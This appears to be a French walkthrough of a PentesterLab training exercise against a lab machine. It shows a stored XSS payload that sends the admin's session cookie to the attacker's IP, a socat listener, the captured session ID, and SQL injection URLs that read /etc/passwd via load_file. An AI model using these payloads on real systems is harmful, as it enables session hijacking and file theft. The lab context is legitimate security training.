pentesterlab.com :
XSS and MySQL FILE

IP : victime : 192.168.1.7
IP : attaquante : 192.168.1.9 


On analyse le site web :
plusieurs méthodes pour trouver une XSS, on va dans un commentaire et on tape :
1337'">< 
pourquoi ? parceque en utilisant le <script>windows.alert('titit')</script> ceci va déclenché les alertes si le site est protéger par un WAF.
Donc en utilisant 1337'">< on peut avoir différent code retour :
si code retour est : 1337 '"> < alors aucun encodage on peut utiliser les balises <script>
si code retour est : 1337'"&gt;&lt; alors, peu d'encodage on peut utiliser les balises <script>, amis aussi <a tag <img tag et d'autre
si code retour est : 1337'&quot;&gt;&lt;
si code retour est : 1337&#39;&quot;>< 

Donc maintenant on sait que ce blog à une faille XSS, sans encodage que l'on peut utiliser avec les baslises <script>.
Maintenant comment l'exploiter ?
Dans les commentaire ajouter ceci (bien mettre l'ip de l'attaquant) :
<script> document.write ('<img src = "http: // 192.168.1.9/?' + document.cookie + '" />'); </ script>

Une fois que l'on a bien enregistrer ce commentaire, on voit un commentaire sur la page.
Sur le serveur attaquant, on ouvre une écoute sur le port 80 avec socat, qui permet de laisser en écoute un serveur web.
On tape dans une cli :
socat TCP-LISTEN: 80, reuseaddr, fork -

On sait que l'admin du site passe une fois toutes les minutes sur toutes les pages du site via un script.
On peut tester en parcourant le site et en lisant le commentaire :
dans le terminal de l'attaquant on aura :
GET /?PHPSESSID=sontufges5gkktn6gcpivtn356 HTTP/1.1
Host: 192.168.1.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://192.168.1.14/post.php?id=2
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7

La partie interressante c'est le cookie ici :
GET /?PHPSESSID=sontufges5gkktn6gcpivtn356 HTTP/1.1

Lorsque l'admin passe sur la page ce cookie devient :
GET /?PHPSESSID=jea8i8b5e5utg4gvpn27ttvlq6 HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34
Referer: http://127.0.0.1/post.php?id=1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en-US,*
Host: 192.168.1.9

PhantomJS c'est le navigateur utiliser par l'admin, en fait c'est un script qui parse toute les page d'un site. Voir Github.
Nous avons donc le cookie de l'admin : 
PHPSESSID=jea8i8b5e5utg4gvpn27ttvlq6

Bon et après ? On ouvre un éditeur de cookie, ou on remplace son cookie par celui de l'admin que l'on a volé juste avant, et on clique sur admin pour ouvrir la page de l'admin.
Et là le sesame s'ouvre, on est admin.

On voit donc la page :
http://192.168.1.14/admin/

dans cette page il y a : avec en menu 

Administration of my Blog

    Home |
    Manage post |
    New post 
avec un tableau :
Welcome	edit	delete
Test	edit	delete
Write a new post

En survolant ce menu avec la souris on voit des url du type :
http://192.168.1.14/admin/edit.php?id=2

Donc on test avec une apostrophe " ' " et on a une erreur qui s'affiche donc sqli potentiellement.
Order by pour trouver les colonnes vulnerable :
http://192.168.1.14/admin/edit.php?id=2 order by 1,2,3,4 --

On voit que c'est la 2 et 3 donc on continue :
http://192.168.1.14/admin/edit.php?id=-2%20union%20select%201,@@version,user(),4%20--
on a la version et le user.

http://192.168.1.14/admin/edit.php?id=-2%20union%20select%201,@@version,load_file(%27/etc/passwd%27),4%20--
On affiche tous le fichier /etc/passwd



 Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /var/www/classes/post.php on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115 









http://192.168.1.14/index.php
https://pentesterlab.com/exercises/xss_and_mysql_file/course



















